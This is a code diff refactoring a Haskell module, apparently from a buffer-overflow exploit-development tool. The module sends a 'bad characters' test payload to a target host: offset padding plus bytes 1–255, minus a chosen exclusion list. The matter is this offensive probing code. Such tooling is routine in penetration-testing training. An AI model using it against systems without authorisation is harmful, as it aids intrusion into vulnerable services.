@@ -3,20 +3,18 @@ module Overflow.BadChars
 ) where
 
 import Overflow
-import Data.Text       (Text, unpack)
 import Data.Char       (chr)
+import Data.Text       (Text, unpack)
 import Data.List.Split
 import Numeric
 
 -- |...
-sendBadChars :: Host -> Int -> Maybe Text -> (Maybe Text, Maybe Text) -> IO () 
+sendBadChars :: Host -> Int -> Maybe Text -> Affix -> IO () 
 sendBadChars h o e a = do
         putStrLn "    ───> Sending characters to target."
-        sendPayload h payload >>= out 
+        sendPayload h payload >>= printResult 
     where
-        payload   = createPayload ((replicate o 'A') ++ characters e) a
-        out  True = putStrLn "Done! Finished sending characters to target."
-        out False = putStrLn "Error: An error occurred sending payload to target."
+        payload = createPayload ((replicate o 'A') ++ characters e) a
 
 -- ...
 characters :: Maybe Text -> String
@@ -27,7 +25,12 @@ characters e = exclude (parseExclude e) $ map chr [1..255]
 -- ...
 parseExclude :: Maybe Text -> String
 parseExclude  Nothing = ""
-parseExclude (Just e) = map (chr . fst) $ concatMap readHex pairs
+parseExclude (Just e) = map (chr . fst) bytes
     where
-        pairs = splitOn "," $ unpack e
+        bytes = concatMap readHex $ splitOn "," $ unpack e
 
+-- ...
+printResult :: Bool -> IO ()
+printResult x
+    | x         = putStrLn "Done! Finished sending characters to target."
+    | otherwise = putStrLn "Error: An error occurred sending payload to target."
